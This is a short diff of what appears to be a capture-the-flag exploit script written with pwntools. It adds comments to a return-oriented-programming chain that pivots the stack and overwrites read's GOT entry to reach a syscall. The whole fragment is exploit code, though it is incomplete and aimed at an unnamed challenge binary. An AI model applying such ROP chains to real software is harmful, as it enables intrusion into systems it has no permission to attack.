@@ -47,7 +47,9 @@ def add_4_rop(rop_list, new_rbp):
     rop = flat([0xaaaaaaaa]*4 + [new_rbp, rbp_20_read_leave_ret])
     r.send(rop)
 
+# now rax=0, rdi=0x0, rsi=0x601048, rdx=0x40
 add_4_rop([pop_rsi_r15, read_plt, 0xdeadbeaf, read_got], buf1+0x20+0x20)
+# now rax=1, read_got = syscall
 add_4_rop([pop_rdi, 0x1, pop_rsi_r15, read_plt], buf1+0x40+0x20)
 
 rop = flat([0xdeadbeaf, read_got, leave_ret, 0xdeadbeaf] + [buf1-0x8, rbp_20_read_leave_ret])
